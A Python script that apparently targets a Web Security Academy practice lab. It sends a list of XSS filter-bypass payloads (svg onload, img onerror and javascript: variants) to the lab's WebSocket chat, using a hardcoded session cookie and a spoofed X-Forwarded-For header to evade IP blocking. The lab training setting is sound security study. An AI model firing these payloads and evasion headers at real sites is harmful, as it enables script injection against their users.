#!/usr/bin/env python3
import asyncio
import websockets
import json

async def test_xss():
    url = "wss://0a9f00fb048cba34808035000032001d.web-security-academy.net/chat"
    
    # Most likely to succeed payloads
    payloads = [
        # SVG usually bypasses img filters
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        
        # Without spaces
        "<img/src=1/onerror=alert(1)>",
        
        # Case variation
        "<IMG SRC=X ONERROR=alert(1)>",
        
        # Backticks
        "<img src=x onerror=alert`1`>",
        
        # Alternative alerts
        "<img src=x onerror=prompt(1)>",
        "<img src=x onerror=confirm(1)>",
        
        # Without quotes
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        
        # Tab injection
        "<img\tsrc=x\tonerror=alert(1)>",
        
        # Object/embed
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
    ]
    
    for i, payload in enumerate(payloads):
        # Rotate IPs to avoid blocking
        headers = {
            'X-Forwarded-For': f'127.0.0.{i+10}',
            'Cookie': 'session=2HQSLLJZkjvQo1iCKN32guMIwjRZMEBe',
            'Origin': 'https://0a9f00fb048cba34808035000032001d.web-security-academy.net',
        }
        
        try:
            async with websockets.connect(url, extra_headers=headers) as ws:
                print(f"[{i+1}] Testing: {payload}")
                
                # Send as JSON message
                message = json.dumps({"message": payload})
                await ws.send(message)
                
                # Get response
                response = await asyncio.wait_for(ws.recv(), timeout=2)
                print(f"    Response: {response[:100]}")
                
                # Check if successful
                if 'alert' in response or 'script' in response:
                    print(f"[!!!] POSSIBLE XSS: {payload}")
                    
        except websockets.exceptions.ConnectionClosed:
            print(f"    [!] Connection closed (filter triggered)")
        except asyncio.TimeoutError:
            print(f"    [!] Timeout")
        except Exception as e:
            print(f"    [!] Error: {e}")
        
        await asyncio.sleep(1)

if __name__ == "__main__":
    print("WebSocket XSS Testing - Quick payloads")
    print("-" * 50)
    asyncio.run(test_xss())